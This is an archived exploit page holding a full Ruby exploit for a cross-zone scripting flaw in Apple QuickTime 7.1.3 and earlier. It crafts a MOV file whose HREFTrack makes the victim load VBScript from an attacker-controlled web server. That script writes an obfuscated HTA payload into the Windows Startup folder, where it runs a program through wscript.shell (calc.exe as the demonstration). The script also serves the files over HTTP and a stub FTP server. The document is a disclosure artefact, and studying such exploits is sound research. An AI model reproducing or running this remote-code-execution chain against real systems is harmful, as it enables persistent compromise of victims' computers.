<html><head><title>Apple Quicktime <= 7.1.3 (HREFTrack) Cross-Zone Scripting Exploit</title></head><pre>#!/usr/bin/ruby
#
# (c) 2006 LMH &lt;lmh [at] info-pull.com&gt;
# Original scripting and POC by Aviv Raff (http://aviv.raffon.net).
#
# Description:
#   Exploit for MOAB-03-01-2007. If argument 'serve' is passed, it uses port 21 for running the
#   fake FTP server (required). HTTP server port can be modified but it's
#   not recommended. Adjust as necessary.
#
# see http://projects.info-pull.com/moab/MOAB-03-01-2007.html

require 'socket'
require 'fileutils'
require 'webrick'

trap 0, proc {
  puts &quot;-- Terminating: #{$$}&quot;
}

REMOTE_HOST   = &quot;192.168.1.133&quot; # Modify to match IP address or hostname
REMOTE_URL    = &quot;http://#{REMOTE_HOST}/&quot; # Modify to match target path (ex. /mypath)
TARGET_SCRIPT = &quot;on error resume next\r\n&quot; +
                &quot;Set c = CreateObject(\&quot;ADODB.Connection\&quot;)\r\n&quot; +
                &quot;co = \&quot;Driver={Microsoft Text Driver (*.txt; *.csv)};Dbq=#{REMOTE_URL};Extensions=txt;\&quot;\r\n&quot; +
                &quot;c.Open co\r\n&quot; +
                &quot;set rs =CreateObject(\&quot;ADODB.Recordset\&quot;)\r\n&quot; +
                &quot;rs.Open \&quot;SELECT * from qtpoc.txt\&quot;, c\r\n&quot; +
                &quot;rs.Save \&quot;C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\poc.hta\&quot;, adPersistXML\r\n&quot; +
                &quot;rs.close\r\n&quot; +
                &quot;c.close\r\n&quot; +
                &quot;window.close\r\n&quot;

HTA_PAYLOAD   = &quot;&lt;script&gt;q='%77%73%63%72%69%70';&lt;/script&gt;\r\n&quot; +
                &quot;&lt;script&gt;q+='%74%2E%73%68%65%6C%6C';&lt;/script&gt;\r\n&quot; +
                &quot;&lt;script&gt;a=new ActiveXObject(unescape(q));&lt;/script&gt;\r\n&quot; +
                &quot;&lt;script&gt;a.run('%windir%\\\\System32\\\\calc.exe');&lt;/script&gt;\r\n&quot; + # executes calc.exe
                &quot;&lt;script&gt;window.close();&lt;/script&gt;\r\n&quot;

HREFTRACK_COD = &quot;A&lt;res://mmcndmgr.dll/prevsym12.htm#%29%3B%3C/style%3E%3Cscript src=\&quot;#{REMOTE_URL}q.vbs\&quot; &quot; +
                &quot;language=\&quot;vbscript\&quot;%3E%3C/script%3E%3C%21--//|&gt; T&lt;&gt;&quot;

TARGET_DIRECTORY = &quot;served&quot;

#
# ---- Real fun starts here ----
#

puts &quot;++ Preparing files...&quot;

#
# Prepare the MOV file with the HREFTrack pointing at our script.
# 
original_mov = File.read(&quot;qtpoc.mov&quot;)

# Prepare directory structure
FileUtils::mkdir(TARGET_DIRECTORY)

puts &quot;++ MOV file....&quot;
# Write the new MOV file
f = File.new(File.join(TARGET_DIRECTORY, &quot;qtpoc.mov&quot;), &quot;w&quot;)
f.write(original_mov)
f.close

puts &quot;++ Script file....&quot;
# Write the script file
f = File.new(File.join(TARGET_DIRECTORY, &quot;q.vbs&quot;), &quot;w&quot;)
f.print(TARGET_SCRIPT)
f.close

puts &quot;++ HTA payload file....&quot;
# Write the new HTA file (payload)
f = File.new(File.join(TARGET_DIRECTORY, &quot;qtpoc.txt&quot;), &quot;w&quot;)
f.print(HTA_PAYLOAD)
f.close

#
# win32 doesn't like fork ;-)
#
if ARGV[0] == &quot;serve&quot;
  # HTTP server... via Webrick
  puts &quot;++ Done. Starting HTTP server...&quot;
  web_server   = WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt;TARGET_DIRECTORY)
  fork do
    begin
      web_server.start
    rescue
      exit
    end
  end

  # FTP server....
  puts &quot;++ Done. Starting FTP server...&quot;
  begin
    ftp_server = TCPServer.new('localhost', 21)
  rescue
    web_server.shutdown
    exit
  end

  # 220 Microsoft FTP Service
  # USER anonymous
  # 331 Anonymous access allowed, send identity (e-mail name) as password.
  # PASS IEUser@
  # 230 Anonymous user logged in.
  # (...)
  while (ftp_session = ftp_server.accept)
    puts &quot;++ FTP: #{ftp_session.gets}&quot;
    # TODO: implement fake responses just to satisfy it.
    ftp_session.close
  end

  # finished
  web_server.shutdown  
end

# milw0rm.com [2007-01-03]</pre></html>